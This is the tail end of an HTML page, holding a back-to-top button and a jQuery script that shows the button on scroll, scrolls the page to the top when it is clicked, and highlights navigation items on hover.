    <a id="back_to_top" class="backToTop" href="javascript:;" title="返回顶部"></a>
</div>
<script>
    var $backToTop_wrap = $(".backToTop_wrap"),
        $backToTop_btn = $("#back_to_top");

    if ($(window).scrollTop() > 100) {
        $backToTop_wrap.removeClass("off");
    }
    else {
        $backToTop_wrap.addClass("off");
    }

    $(window).on("scroll", function () {
        if ($(this).scrollTop() > 100) {
            $backToTop_wrap.removeClass("off");
        }
        else {
            $backToTop_wrap.addClass("off");
        }
    });

    $backToTop_btn.on("click", function () {
        $("html, body").animate({scrollTop: 0}, 120);
    });

    $(function () {
        var navlist = $('.nav-list > li');

        navlist.each(function () {
            $(this).on('mouseenter', function () {
                $(this).addClass('selected');
            });

            $(this).on('mouseleave', function () {
                $(this).removeClass('selected');
            });
        });
    })
</script>



</body>
</html>
